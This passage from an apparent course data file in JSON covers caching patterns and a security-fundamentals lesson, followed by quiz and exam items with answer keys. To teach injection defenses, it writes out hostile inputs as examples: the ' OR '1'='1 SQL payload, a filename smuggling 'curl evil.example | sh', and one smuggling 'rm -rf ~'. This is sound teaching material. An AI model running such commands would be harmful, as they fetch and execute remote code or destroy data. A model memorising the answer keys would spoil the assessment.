              "why": "Writes update the cache and the store together, so cached reads are fresh. Write latency rises, and you cache data that may never be read; pair with TTLs to evict it."
            },
            {
              "signal": "A hot cache key expires and thousands of identical queries hit the database at once",
              "use": "Stampede protection",
              "why": "Let one request recompute while others wait or serve the stale value (single-flight, a lock, early refresh), and jitter TTLs so keys do not expire together. Adds complexity to the cache path."
            },
            {
              "signal": "Keys are spread over cache nodes with `hash(key) % N` and adding one node invalidates almost everything",
              "use": "Consistent hashing",
              "why": "Nodes sit on a hash ring and only about 1/N of keys move when one is added or removed. Use virtual nodes to even out the load; hot single keys still need separate handling."
            },
            {
              "signal": "A user saves their profile, is redirected, and sees old data because reads go to an async follower",
              "use": "Read-your-writes routing",
              "why": "Route that user's reads to the leader for a short window, or until the follower has caught up to their write position. Costs leader load and session-aware routing."
            },
            {
              "signal": "A design requires strong consistency and full availability even during network partitions",
              "use": "Choose per CAP/PACELC",
              "why": "During a partition you must refuse some requests or serve possibly stale data; even when healthy, stronger consistency costs latency. Decide per operation: balances vs like counts."
            }
          ]
        }
      ],
      "keyPoints": [
        "A remote call can succeed, fail, or be unknown; design for the unknown outcome.",
        "During a partition you choose consistency or availability; PACELC adds the everyday latency vs consistency trade-off.",
        "Async replication is fast but can lose recent writes and serve stale reads; consistency models name what reads may see.",
        "Queues are typically at-least-once, so consumers must be idempotent.",
        "Retry only idempotent work, with timeouts, backoff and jitter; caches need an invalidation and stampede plan."
      ],
      "quiz": [
        {
          "q": "A service calls a payment API and gets a read timeout. What is the safest correct treatment?",
          "options": [
            "Treat it as unknown, retry with the same idempotency key, then reconcile",
            "Assume it failed and ask the user to submit a fresh payment request",
            "Assume it succeeded and mark the order paid to avoid double charges",
            "Retry with a new idempotency key so the server cannot replay an error"
          ],
          "answer": 0,
          "explain": "A timeout does not reveal whether the server acted. Reusing the same idempotency key makes the retry safe whichever way the first attempt went."
        },
        {
          "q": "A queue delivers at-least-once. A consumer that sends welcome emails keeps sending duplicates after crashes. What is the correct fix?",
          "options": [
            "Switch to a broker advertising exactly-once and drop the dedupe checks",
            "Set the visibility timeout to zero so messages are redelivered sooner",
            "Process messages on a single thread so each is handled only once",
            "Make the consumer idempotent, e.g. skip message IDs already processed"
          ],
          "answer": 3,
          "explain": "Duplicates are inherent to at-least-once delivery. Idempotent handling (deduplication by message or business ID) gives effectively-once behavior; a single thread still sees redeliveries."
        },
        {
          "q": "According to PACELC, what trade-off exists even when the network is healthy?",
          "options": [
            "Partition tolerance versus durability",
            "Throughput versus storage cost",
            "Availability versus security",
            "Latency versus consistency"
          ],
          "answer": 3,
          "explain": "Without a partition, waiting for replicas to confirm writes improves consistency but adds latency. That is the 'Else' clause of PACELC."
        },
        {
          "q": "A user edits their profile, is redirected, and sees the old data. Reads go to an asynchronous follower. Which mitigation fits?",
          "options": [
            "Route that user's reads to the leader briefly after a write",
            "Remove the redirect so the browser keeps the submitted form",
            "Raise the cache TTL so the profile page is served consistently",
            "Disable replication and serve every read from a nightly backup"
          ],
          "answer": 0,
          "explain": "The follower lagged behind the leader. Read-your-writes consistency targets exactly this symptom without requiring strong consistency for everyone."
        },
        {
          "q": "A hot cache key expires and the database collapses under thousands of simultaneous identical queries. What is this and how do you reduce it?",
          "options": [
            "A deadlock; add a lock timeout so blocked queries fail fast",
            "A partition; add replicas so the reads spread across nodes",
            "A cache stampede; coalesce loads, jitter TTLs, or serve stale",
            "A phantom read; use serializable isolation for the page query"
          ],
          "answer": 2,
          "explain": "Simultaneous misses on one expired key all go to the origin. Coalescing or stale-while-revalidate collapses them to a single refill."
        },
        {
          "q": "An order service commits the order row, then publishes `OrderPlaced` to the broker. After a pod crash between the two steps, the warehouse never hears about some committed orders. What should you reach for?",
          "options": [
            "Retry the broker publish in a loop inside the same web request",
            "Write the event to an outbox table in the same transaction",
            "Publish the event first and write the order row only afterwards",
            "Add a circuit breaker around all of the broker client calls"
          ],
          "answer": 1,
          "explain": "Putting the event in the same transaction as the state change means a crash cannot separate them. Retries in memory die with the pod, and publishing first just swaps which half can be lost."
        }
      ]
    },
    {
      "id": "security-fundamentals",
      "title": "Security Fundamentals",
      "minutes": 11,
      "summary": "Threat modeling, authN vs authZ, injection and other top risks, secrets management, and least privilege.",
      "lesson": [
        {
          "type": "p",
          "text": "You ship a search feature in an afternoon. A week later someone enters `' OR '1'='1` and downloads your users table. Security failures are rarely exotic: most are a small set of well-known mistakes in how software treats untrusted input, identity and secrets. You cannot bolt security on at the end, and you cannot delegate it entirely to a tool, so you need the vocabulary and the habits."
        },
        {
          "type": "h",
          "text": "Threat modeling"
        },
        {
          "type": "p",
          "text": "**Threat modeling** is asking, before building: what are we protecting (assets), who might attack it and how (adversaries, entry points), and what is the impact if it happens? A lightweight version is four questions: What are we building? What can go wrong? What are we doing about it? Did we do a good job? Identify **trust boundaries**, where data crosses from a less-trusted to a more-trusted zone (browser to server, public internet to internal service, user content to your database). Everything crossing a boundary is untrusted until validated. Prioritize by likelihood times impact, not by what is most fun to defend."
        },
        {
          "type": "h",
          "text": "Authentication vs authorization"
        },
        {
          "type": "list",
          "items": [
            "**Authentication (authN)**: who are you? Passwords (hashed with bcrypt, scrypt or Argon2, never encrypted or plain), passkeys, OAuth/OIDC sign-in, MFA.",
            "**Authorization (authZ)**: what are you allowed to do? Checked on **every request, on the server**, for the specific resource."
          ]
        },
        {
          "type": "p",
          "text": "The most common real-world flaw is broken access control, especially **IDOR** (insecure direct object reference): `GET /invoices/1042` returns the invoice to any logged-in user because the code checks that you are authenticated but not that invoice 1042 is yours. Hiding buttons in the UI is not authorization."
        },
        {
          "type": "h",
          "text": "OWASP Top 10 themes"
        },
        {
          "type": "p",
          "text": "The OWASP Top 10 is a periodically updated ranking of the most critical web risks. The current edition (2025) lists: broken access control, security misconfiguration, software supply chain failures, cryptographic failures, injection, insecure design, authentication failures, software or data integrity failures, security logging and alerting failures, and mishandling of exceptional conditions. Server-side request forgery (SSRF), a separate category in 2021, is now folded into broken access control, and 'vulnerable and outdated components' was widened into supply chain failures. Broken access control has held the top spot since 2021. Learn the categories as a checklist for review rather than memorizing numbers."
        },
        {
          "type": "h",
          "text": "Injection"
        },
        {
          "type": "p",
          "text": "**Injection** happens when untrusted data is concatenated into a command or query so the interpreter treats it as code. SQL injection is the classic; command injection, template injection, and **XSS** (injecting script into pages) are siblings. The fix is the same principle: keep code and data separate."
        },
        {
          "type": "code",
          "lang": "python",
          "text": "# VULNERABLE: input becomes part of the SQL\nname = request.args['name']\ndb.execute(\"SELECT * FROM users WHERE name = '\" + name + \"'\")\n\n# SAFE: parameterized query; the driver sends data separately from code\ndb.execute('SELECT * FROM users WHERE name = %s', (name,))\n\n# VULNERABLE command injection\nos.system('convert ' + filename + ' out.png')\n# SAFE: no shell, argument list\nsubprocess.run(['convert', filename, 'out.png'], check=True)"
        },
        {
          "type": "figure",
          "id": "systems-sql-injection",
          "caption": "Concatenation lets the input's quote end the string and turn the rest into SQL; a parameterized query keeps the input as data.",
          "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 640 312\" role=\"img\" aria-label=\"Top: the input quote OR 1=1 is concatenated into the SQL string and becomes code that matches every user. Bottom: with a parameterized query the SQL text and the input travel separately and the database finds 0 rows\"> <style>.systems-sql-injection-t{font-size:14px;fill:var(--fig-ink)} .systems-sql-injection-b{font-size:14px;font-weight:600;fill:var(--fig-ink)} .systems-sql-injection-m{font-size:13px;fill:var(--fig-muted)} .systems-sql-injection-mono{font-family:ui-monospace,Menlo,monospace} .systems-sql-injection-mid{text-anchor:middle}.systems-sql-injection-end{text-anchor:end} .systems-sql-injection-ln{stroke:var(--fig-line);stroke-width:1.5;fill:none} .systems-sql-injection-dash{stroke-dasharray:4 4} .systems-sql-injection-box{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-sql-injection-halo{paint-order:stroke;stroke:var(--fig-bg);stroke-width:4px;stroke-linejoin:round} .systems-sql-injection-badt{fill:var(--fig-bad)}.systems-sql-injection-okt{fill:var(--fig-ok)} .systems-sql-injection-inj{fill:var(--fig-bad);font-weight:600;animation:systems-sql-injection-slotf 7s linear infinite} .systems-sql-injection-under{stroke:var(--fig-bad);stroke-width:2;stroke-linecap:round;animation:systems-sql-injection-slot 7s linear infinite} .systems-sql-injection-chip{fill:var(--fig-accent2);fill-opacity:.12;stroke:var(--fig-accent2);stroke-width:1.5} .systems-sql-injection-c1{stroke:var(--fig-accent);stroke-width:1.75;fill:none;marker-end:url(#systems-sql-injection-a1)} .systems-sql-injection-c2{stroke:var(--fig-accent2);stroke-width:1.75;fill:none;marker-end:url(#systems-sql-injection-a2)} .systems-sql-injection-f1{fill:var(--fig-accent)}.systems-sql-injection-f2{fill:var(--fig-accent2)} .systems-sql-injection-ghost{fill:var(--fig-bad);opacity:0;animation:systems-sql-injection-fly 7s ease-in-out infinite} .systems-sql-injection-dc{fill:var(--fig-accent);opacity:0;animation:systems-sql-injection-hc 7s linear infinite} .systems-sql-injection-dd{fill:var(--fig-accent2);opacity:0;animation:systems-sql-injection-hd 7s linear infinite} @keyframes systems-sql-injection-fly{0%{transform:translate(511.6px,29px);opacity:1}25%{transform:translate(321.6px,73px);opacity:1}25.1%,100%{transform:translate(321.6px,73px);opacity:0}} @keyframes systems-sql-injection-slot{0%,24.9%{opacity:0}25%,100%{opacity:1}} @keyframes systems-sql-injection-slotf{0%,24.9%{fill-opacity:0}25%,100%{fill-opacity:1}} @keyframes systems-sql-injection-hc{0%{transform:translate(350px,198px);opacity:0}44.9%{transform:translate(350px,198px);opacity:0}45%{transform:translate(350px,198px);opacity:1}65%{transform:translate(486px,198px);opacity:1}65.1%{transform:translate(486px,198px);opacity:0}100%{transform:translate(486px,198px);opacity:0}} @keyframes systems-sql-injection-hd{0%{transform:translate(148.4px,250px);opacity:0}51.9%{transform:translate(148.4px,250px);opacity:0}52%{transform:translate(148.4px,250px);opacity:1}80%{transform:translate(486px,250px);opacity:1}80.1%{transform:translate(486px,250px);opacity:0}100%{transform:translate(486px,250px);opacity:0}}</style> <defs><marker id=\"systems-sql-injection-a1\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0L10 5L0 10z\" class=\"systems-sql-injection-f1\"/></marker><marker id=\"systems-sql-injection-a2\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"7\" markerHeight=\"7\" orient=\"auto-start-reverse\"><path d=\"M0 0L10 5L0 10z\" class=\"systems-sql-injection-f2\"/></marker></defs><text class=\"systems-sql-injection-b systems-sql-injection-badt\" x=\"24\" y=\"28\">String concatenation</text><text class=\"systems-sql-injection-m systems-sql-injection-end\" x=\"489.6\" y=\"28\">input</text><rect class=\"systems-sql-injection-chip\" x=\"499.6\" y=\"12\" width=\"116.4\" height=\"24\" rx=\"8\"/><text class=\"systems-sql-injection-t systems-sql-injection-mono\" x=\"511.6\" y=\"29\" textLength=\"92.4\" lengthAdjust=\"spacing\">&#39; OR &#39;1&#39;=&#39;1</text><rect class=\"systems-sql-injection-box\" x=\"24\" y=\"48\" width=\"592\" height=\"40\" rx=\"10\"/><text class=\"systems-sql-injection-t systems-sql-injection-mono\" x=\"36\" y=\"73\" textLength=\"386.4\" lengthAdjust=\"spacing\">SELECT * FROM users WHERE name = &#39;<tspan class=\"systems-sql-injection-inj\">&#39; OR &#39;1&#39;=&#39;1</tspan>&#39;</text><path class=\"systems-sql-injection-under\" d=\"M338.4 80H422.4\"/><text class=\"systems-sql-injection-m\" x=\"24\" y=\"114\">The quote closes the string, so OR &#39;1&#39;=&#39;1&#39; runs as SQL: every user is returned</text><text class=\"systems-sql-injection-t systems-sql-injection-mono systems-sql-injection-ghost\" x=\"0\" y=\"0\" textLength=\"92.4\" lengthAdjust=\"spacing\">&#39; OR &#39;1&#39;=&#39;1</text><path class=\"systems-sql-injection-ln\" d=\"M24 138H616\"/><text class=\"systems-sql-injection-b systems-sql-injection-okt\" x=\"24\" y=\"166\">Parameterized query</text><rect class=\"systems-sql-injection-box\" x=\"24\" y=\"180\" width=\"318\" height=\"36\" rx=\"10\"/><text class=\"systems-sql-injection-t systems-sql-injection-mono\" x=\"36\" y=\"203\" textLength=\"294\" lengthAdjust=\"spacing\">SELECT * FROM users WHERE name = %s</text><rect class=\"systems-sql-injection-chip\" x=\"24\" y=\"232\" width=\"116.4\" height=\"36\" rx=\"10\"/><text class=\"systems-sql-injection-t systems-sql-injection-mono\" x=\"36\" y=\"255\" textLength=\"92.4\" lengthAdjust=\"spacing\">&#39; OR &#39;1&#39;=&#39;1</text><path class=\"systems-sql-injection-c1\" d=\"M350 198H488\"/><text class=\"systems-sql-injection-m systems-sql-injection-mid\" x=\"417\" y=\"190\">code</text><path class=\"systems-sql-injection-c2\" d=\"M148.4 250H488\"/><text class=\"systems-sql-injection-m systems-sql-injection-mid\" x=\"316.2\" y=\"242\">data, sent separately</text><rect class=\"systems-sql-injection-box\" x=\"492\" y=\"176\" width=\"124\" height=\"96\" rx=\"12\"/><text class=\"systems-sql-injection-t systems-sql-injection-mid\" x=\"554\" y=\"222\">database</text><text class=\"systems-sql-injection-m systems-sql-injection-mid\" x=\"554\" y=\"240\">0 rows</text><text class=\"systems-sql-injection-m\" x=\"24\" y=\"298\">The driver binds the input as one literal value: no user is named &#39; OR &#39;1&#39;=&#39;1</text><circle class=\"systems-sql-injection-dc\" r=\"5\"/><circle class=\"systems-sql-injection-dd\" r=\"5\"/> </svg>"
        },
        {
          "type": "p",
          "text": "For XSS, rely on frameworks that escape output by default, and avoid raw-HTML insertion APIs with user content. Validate input for shape (length, type, allowed values) but treat validation as a supplement: parameterization and output encoding are the real defenses."
        },
        {
          "type": "h",
          "text": "Secrets management"
        },
        {
          "type": "p",
          "text": "A **secret** is anything that grants access: API keys, database passwords, signing keys, tokens. Never commit them to Git; history is forever and bots scan public repos within minutes. Keep them in environment variables injected at runtime or in a secrets manager (Vault, cloud secret stores), keep `.env` in `.gitignore`, and use separate secrets per environment. Assume leaks will happen: support **rotation**, scope each key narrowly, and if one is committed, revoke and rotate it immediately because deleting the commit does not un-leak it."
        },
        {
          "type": "h",
          "text": "Least privilege"
        },
        {
          "type": "p",
          "text": "Give every user, service and token only the permissions required for its job, for only as long as needed. The reporting service gets a read-only database role; the CI deploy token cannot read production secrets; the app's DB user cannot `DROP TABLE`. This does not stop the first breach but limits the **blast radius** when it happens. Combine with **defense in depth**: several independent layers so one failure is not fatal."
        },
        {
          "type": "callout",
          "kind": "agent",
          "text": "AI-generated code often builds SQL with f-strings, checks login but not ownership, logs tokens, hard-codes example keys that become real ones, and runs with broad credentials because that makes the demo work. Give the agent your threat context ('multi-tenant, users must never see another tenant's data'), require parameterized queries and per-resource authorization checks, and never paste real secrets into a prompt. Treat any content an agent reads (web pages, issues, files) as untrusted input that may contain instructions aimed at the agent; keep its credentials minimal and its destructive actions gated."
        },
        {
          "type": "callout",
          "kind": "warn",
          "text": "Do not roll your own cryptography or password storage. Use vetted libraries and managed identity providers, and keep dependencies updated; many breaches exploit a known flaw in an old package."
        },
        {
          "type": "patterns",
          "patterns": [
            {
              "signal": "SQL is built by concatenating or formatting user input into the query string",
              "use": "Parameterised queries",
              "why": "Placeholders send data separately from the SQL text, so input can never become code. Identifiers such as column names cannot be parameters; pick those from an allowlist."
            },
            {
              "signal": "A shell command string is assembled with a filename or argument that comes from a user",
              "use": "Argument list without a shell",
              "why": "Pass an argv array to the process API with shell execution off, so `;` or `$()` stay literal. Still validate the values, and reject leading `-` that could become an option."
            },
            {
              "signal": "User-supplied text is inserted into HTML, attributes or inline scripts",
              "use": "Context-aware output escaping",
              "why": "Escape for the exact context at render time, ideally via an auto-escaping template engine. Raw-HTML escape hatches bypass it; add a Content Security Policy as a second layer."
            },
            {
              "signal": "`GET /api/invoices/1042` returns any invoice to any logged-in user who changes the id",
              "use": "Object-level authorization check",
              "why": "Authentication proves who the caller is; every request must also check server-side that this caller may access this specific record. Unguessable ids help but are not access control."
            },
            {
              "signal": "An API key or password was committed to a repository, even if removed in the next commit",
              "use": "Revoke and rotate the leaked secret",
              "why": "Git history, forks and scanners keep it forever, and bots find public keys in minutes. Revoke and issue a new one first, then check logs for misuse; history rewriting is optional cleanup."
            },
            {
              "signal": "Credentials live in source files, config committed to git, or are shared over chat",
              "use": "Secrets manager",
              "why": "Store secrets in a vault or the platform's secret store and inject them at runtime, with access control, audit logs and rotation. Keep them out of logs and error messages too."
            },
            {
              "signal": "A read-only report job connects to the database as the owner account",
              "use": "Least-privilege role",
              "why": "A dedicated role with `SELECT` on just the needed tables limits the blast radius if the job is compromised or buggy. Costs some setup and occasional permission requests."
            },
            {
              "signal": "Passwords are stored with a fast hash like SHA-256 or MD5, or unsalted",
              "use": "Slow salted password hash",
              "why": "Use Argon2id, scrypt or bcrypt with a per-user salt so offline guessing is expensive. Tune the cost to tens of milliseconds per login; never encrypt passwords reversibly."
            },
            {
              "signal": "A new feature handles payments, uploads or admin actions and nobody has asked what could go wrong",
              "use": "Threat model",
              "why": "List assets, trust boundaries, plausible attackers and impact before building, then put controls where input crosses a boundary. A short whiteboard session beats auditing afterwards."
            },
            {
              "signal": "A single control, such as the firewall or the login page, is the only thing protecting sensitive data",
              "use": "Defense in depth",
              "why": "Layer independent controls (authz checks, encryption, network rules, monitoring) so one mistake is not a breach. Each layer adds cost, so prioritise by asset value from the threat model."
            }
          ]
        }
      ],
      "keyPoints": [
        "Threat model first: assets, trust boundaries, plausible attackers, impact.",
        "AuthN proves identity; authZ must be enforced server-side on every request for the specific resource (watch for IDOR).",
        "Injection comes from mixing code and data; use parameterized queries, argument lists and output escaping.",
        "Keep secrets out of source control, rotate them, and revoke anything that leaked.",
        "Least privilege and defense in depth shrink the blast radius of inevitable mistakes."
      ],
      "quiz": [
        {
          "q": "`GET /api/invoices/1042` returns any invoice to any logged-in user who guesses the ID. Which category of flaw is this?",
          "options": [
            "SQL injection through the numeric invoice ID in the path",
            "Cross-site scripting via the invoice data in the response",
            "Weak password hashing that lets users log in as others",
            "Broken access control (IDOR): login checked, ownership not"
          ],
          "answer": 3,
          "explain": "The user is authenticated, but the server fails to verify they are authorized for that specific resource. That is an insecure direct object reference."
        },
        {
          "q": "Which is the most reliable defense against SQL injection?",
          "options": [
            "Parameterized queries, so input is never parsed as SQL",
            "Stripping or escaping quote characters in all input",
            "Hiding database error messages from API responses",
            "Limiting form field length to block long payloads"
          ],
          "answer": 0,
          "explain": "Parameterization separates code from data structurally. Character stripping is fragile (numeric contexts, encodings), and hiding errors or limiting length only makes attacks slightly harder."
        },
        {
          "q": "An API key is accidentally committed to a public repo, and you delete it in the next commit within a minute. What should you do?",
          "options": [
            "Nothing; the key no longer appears in the latest commit",
            "Force-push rewritten history, which removes every copy",
            "Revoke and rotate the key now; it may already be harvested",
            "Make the repo private and keep using the same key"
          ],
          "answer": 2,
          "explain": "Automated scanners harvest keys quickly, and forks, clones and caches keep history. Only revocation actually removes the risk."
        },
        {
          "q": "Which statement best describes authentication versus authorization?",
          "options": [
            "AuthN decides what you may do; authZ verifies who you are",
            "They are one check, performed at login and again per request",
            "AuthZ is only needed for admins; authN covers everyone else",
            "AuthN verifies identity; authZ decides if it may act on a resource"
          ],
          "answer": 3,
          "explain": "AuthN answers 'who', authZ answers 'may this identity do this to this resource'. Each request needs both."
        },
        {
          "q": "A nightly report job needs to read three tables. It currently connects as the database owner. What does least privilege suggest?",
          "options": [
            "Keep the owner role so the job never hits permission errors",
            "Keep the owner role but rotate its password every week",
            "Create a dedicated role with SELECT on only those three tables",
            "Run the job inside the web server so it reuses its credentials"
          ],
          "answer": 2,
          "explain": "A narrowly scoped read-only role limits damage if the job or its credentials are compromised. Rotation helps but leaves the blast radius unchanged."
        },
        {
          "q": "A thumbnail endpoint runs `convert ` + filename + ` out.png` through a shell. A user uploads a file named `a.png; curl evil.example | sh`. Which approach fits best?",
          "options": [
            "Strip semicolons and pipes from the filename before running it",
            "Use parameterised queries when saving the filename to the database",
            "Pass the program and arguments as a list, with the shell off",
            "Escape the filename for HTML before it is shown in the page"
          ],
          "answer": 2,
          "explain": "With an argument list and no shell, metacharacters stay literal. Stripping a blacklist of characters is easy to bypass (`$()`, newlines), and SQL or HTML escaping protects different sinks."
        }
      ]
    }
  ],
  "exam": [
    {
      "q": "A service checks `if os.environ.get('MAINTENANCE_MODE'):` and the deployment sets `MAINTENANCE_MODE=false`. What happens?",
      "options": [
        "Maintenance mode turns on, because the non-empty string 'false' is truthy",
        "Maintenance mode stays off, because Python parses 'false' as False",
        "The process fails to start, since env values must be 'true' or '1'",
        "Maintenance mode stays off, because unset and 'false' are equivalent"
      ],
      "answer": 0,
      "explain": "Environment values are always strings. Any non-empty string, including 'false' and '0', is truthy in Python, so the value must be parsed explicitly."
    },
    {
      "q": "An agent reports it 'fixed' an HTTPS error in your internal client by setting `verify=False`. What is the correct reaction?",
      "options": [
        "Accept it; the error is gone, so the connection is now working",
        "Accept it for internal traffic only, since the internal network is trusted",
        "Reject it: it drops server authentication; trust the right CA or fix the cert",
        "Reject it, and switch the client to plain HTTP to avoid certificate issues"
      ],
      "answer": 2,
      "explain": "Disabling verification silences the symptom by discarding TLS's identity guarantee, enabling man-in-the-middle attacks even on internal networks. Fix the root cause (untrusted CA or mismatched certificate); plain HTTP is worse still."
    },
    {
      "q": "A user request passes through an API gateway, then a service, then a database client library. During a database outage, each of those three layers makes up to 3 attempts on failure. How many calls can one user request send to the database?",
      "options": [
        "3",
        "9",
        "27",
        "81"
      ],
      "answer": 2,
      "explain": "Attempts multiply across layers: 3 x 3 x 3 = 27. Stacked retries amplify load on a struggling dependency, which is why you retry at one layer only, with a capped budget and backoff."
    },
    {
      "q": "Why does HTTP/3 run over QUIC on UDP instead of over TCP?",
      "options": [
        "UDP guarantees delivery, so QUIC needs no retransmission logic",
        "QUIC's per-stream reliability avoids TCP's head-of-line blocking",
        "UDP traffic bypasses firewalls, so HTTP/3 does not need TLS",
        "TCP cannot carry encrypted traffic once TLS 1.3 is negotiated"
      ],
      "answer": 1,
      "explain": "QUIC rebuilds reliability, ordering and encryption per stream on top of UDP, so one lost packet stalls only its own stream. UDP itself guarantees nothing, and QUIC always uses TLS 1.3."
    },
    {
      "q": "Your API list endpoint returns every row. It works in staging with 200 rows and times out in production with 5 million. What is the best design change?",
      "options": [
        "Raise the server and client timeouts to 10 minutes",
        "Gzip the full response to cut its transfer time",
        "Cache the full response in Redis for a whole day",
        "Paginate with a cursor and enforce a max page size"
      ],
      "answer": 3,
      "explain": "Unbounded responses do not scale. Bounded pages protect memory, latency and the database, and cursors stay fast on deep, changing data. Timeouts, compression and caching only postpone the failure."
    },
    {
      "q": "Your Postgres leader replicates asynchronously to a follower. The leader's disk dies and you promote the follower. Customers report orders that were confirmed seconds earlier are now missing. Why?",
      "options": [
        "Promotion rolls back the last minute of transactions for safety",
        "Acknowledged writes had not reached the follower; sync replication avoids this",
        "The follower rejected those rows as foreign key violations on promotion",
        "Read-your-writes routing sent the customers to a stale application cache"
      ],
      "answer": 1,
      "explain": "With asynchronous replication the leader confirms a commit before followers have it, so a leader crash loses the replication lag. Synchronous replication closes the gap at the cost of write latency (the PACELC latency vs consistency trade-off)."
    },
    {
      "q": "A query joining `orders` to `order_items` on `order_id` is slow, and `EXPLAIN` shows a sequential scan of `order_items`. What is the most likely fix?",
      "options": [
        "Add an index on `order_items(order_id)`, the join column",
        "Raise the isolation level so the join reads a stable snapshot",
        "Denormalize customer email into `order_items` to skip a join",
        "Run VACUUM FULL on `order_items` to shrink the table on disk"
      ],
      "answer": 0,
      "explain": "Postgres does not index foreign key columns automatically. A sequential scan on the join column indicates a missing index; isolation level and denormalizing unrelated columns do not change the access path."
    },
    {
      "q": "An agent writes `os.system('convert ' + filename + ' out.png')` to process user uploads. What should you require?",
      "options": [
        "Wrap the filename in single quotes inside the command string",
        "Run the conversion only for users who are logged in",
        "Reject filenames longer than 255 characters beforehand",
        "Pass an argument list to `subprocess.run`, with no shell"
      ],
      "answer": 3,
      "explain": "Building a shell string lets a filename like `x; rm -rf ~` become a command. An argument list without a shell keeps it as data. Hand-added quotes break on filenames containing quotes, and login or length checks do not stop injection."
    },
    {
      "q": "Which is the best description of a file descriptor?",
      "options": [
        "A per-process integer handle for an open file, pipe or socket",
        "The permission string (such as rwxr-xr-x) stored with a file",
        "An in-memory copy of a file's contents kept by the kernel",
        "The absolute path the kernel uses to locate an executable"
      ],
      "answer": 0,
      "explain": "File descriptors are small integers indexing the process's table of open resources, subject to a per-process limit."
    },
    {
      "q": "Two transactions each check that at least one doctor is on call, then each takes a different doctor off call. Both commit and nobody is on call. Which concept explains this and what prevents it?",
      "options": [
        "A dirty read; prevent it by switching to read uncommitted",
        "A deadlock; prevent it with an index on the on-call column",
        "Write skew; use serializable isolation or lock the checked rows",
        "A lost update on one row; prevent it with an atomic UPDATE"
      ],
      "answer": 2,
      "explain": "Each transaction made a decision from a snapshot that the other invalidated, while writing different rows, so no single-row lost update or dirty read occurred. Serializable isolation or explicit locking forces the conflict to surface."
    },
    {
      "q": "You must expose the same data to a web app, a mobile app, and partners, each needing different field subsets. The current REST API forces many round trips and over-fetching. Which statement is the most reasonable?",
      "options": [
        "REST responses cannot be cached, so any alternative is better",
        "GraphQL fits varied field needs but adds cost, caching and N+1 work",
        "GraphQL resolves fields on the client, so no server authZ is needed",
        "gRPC is the standard choice here because browsers call it natively"
      ],
      "answer": 1,
      "explain": "GraphQL targets exactly this pain but brings query-cost control, harder HTTP caching and server-side N+1 risks, so weigh it against tailored REST endpoints. REST caches well, authorization is always server-side, and browsers need gRPC-Web proxies."
    },
    {
      "q": "Product prices are cached in Redis using cache-aside with no TTL. After an admin changes a price in the database, the site keeps showing the old price indefinitely. What fixes it?",
      "options": [
        "Add retries around Redis reads so they eventually see the new value",
        "Give Redis more memory so the new price can sit beside the old one",
        "Read prices from a database replica rather than from the primary",
        "Delete the key in the price-update path, and add a TTL as a backstop"
      ],
      "answer": 3,
      "explain": "Cache-aside only refills on a miss, so with no TTL and no invalidation the stale entry lives forever. Deleting on write fixes the normal path; a TTL bounds staleness if some write path forgets."
    },
    {
      "q": "A teammate says: 'The app hides the Delete button for non-admins, so the API doesn't need a permission check.' What is the problem?",
      "options": [
        "None; non-admins never see the button, so they cannot delete",
        "Anyone can call the API directly, so the server must check each request",
        "Hiding is fine as long as the API route is not documented anywhere",
        "It only needs a confirmation dialog to stop accidental deletions"
      ],
      "answer": 1,
      "explain": "Client-side hiding is a convenience, not a control. Attackers send requests directly and routes are easy to discover, so the server must check permissions."
    },
    {
      "q": "Assuming the request is idempotent, which response should a generic HTTP client automatically retry?",
      "options": [
        "400 Bad Request for a missing field",
        "422 Unprocessable Content for a bad email",
        "503 Service Unavailable with Retry-After: 5",
        "403 Forbidden for a resource you cannot access"
      ],
      "answer": 2,
      "explain": "5xx responses like 503 signal a server-side, often transient problem, and Retry-After says when to try again. 4xx errors mean the request itself must change; resending it unchanged will fail the same way."
    },
    {
      "kind": "order",
      "q": "Put the steps of a first visit to `https://shop.example.com/cart` in order (nothing is cached yet).",
      "steps": [
        "DNS resolves `shop.example.com` to an IP address",
        "TCP handshake to that IP on port 443",
        "TLS handshake: the browser verifies the certificate and agrees keys",
        "Browser sends `GET /cart` over the encrypted connection",
        "Browser parses the HTML and fetches its CSS, JS and images"
      ],
      "explain": "You need an IP before you can open a connection, a TCP connection before TLS can run over it, and an encrypted session before the HTTP request is sent. Subresources are only discovered once the HTML arrives."
    },
    {
      "kind": "order",
      "q": "Kubernetes stops a pod running a well-behaved HTTP server. Put the shutdown in order.",
      "steps": [
        "Kubernetes sends `SIGTERM` to the process",
        "The handler stops accepting new requests",
        "In-flight requests finish (drain)",
        "Buffers are flushed",
        "The process exits with status 0 before the grace period ends"
      ],
      "explain": "`SIGTERM` starts a graceful shutdown. The server closes the door to new work first, then finishes what it already accepted, flushes, and exits. If it is still running when the grace period ends, it gets `SIGKILL`, which cannot be caught."
    },
    {
      "kind": "order",
      "q": "A consumer reads from an at-least-once queue and must charge each order effectively once. Order its steps.",
      "steps": [
        "Receive the message",
        "Look up the message id in a processed-ids table and skip it if already there",
        "Apply the effect and record the message id in one transaction",
        "Acknowledge the message to the queue"
      ],
      "explain": "Acknowledge last: a crash before the ack means the message is redelivered, and the processed-ids check turns that duplicate into a no-op. Recording the id in the same transaction as the effect means you can never have one without the other."
    },
    {
      "kind": "line",
      "q": "Click the line that makes this query unsafe.",
      "lang": "python",
      "code": "def find_orders(db, email, status):\n    status = status.lower()\n    if status not in ('open', 'shipped', 'cancelled'):\n        raise ValueError('bad status')\n    sql = ('SELECT o.id, o.total_cents FROM orders o '\n           'JOIN customers c ON c.id = o.customer_id '\n           \"WHERE c.email = '\" + email + \"' AND o.status = %s\")\n    rows = db.execute(sql, (status,))\n    return [dict(r) for r in rows]",
      "answer": 6,
      "explain": "Line 7 concatenates the user-supplied `email` into the SQL text, so an input like `' OR '1'='1` changes the query (SQL injection). `status` is already allow-listed and parameterized. Fix: use `WHERE c.email = %s AND o.status = %s` and pass `(email, status)`."
    },
    {
      "kind": "line",
      "q": "This retry loop can charge a customer twice. Click the buggy line.",
      "lang": "python",
      "code": "def charge(order_id, amount):\n    for attempt in range(5):\n        key = str(uuid.uuid4())\n        try:\n            return payments.post('/charges', json={'amount': amount},\n                                 headers={'Idempotency-Key': key}, timeout=3)\n        except (Timeout, ConnectionError, Http5xx):\n            sleep(min(30, 0.2 * 2 ** attempt) * random.uniform(0.5, 1.5))\n    raise ChargeUnknown(order_id)",
      "answer": 2,
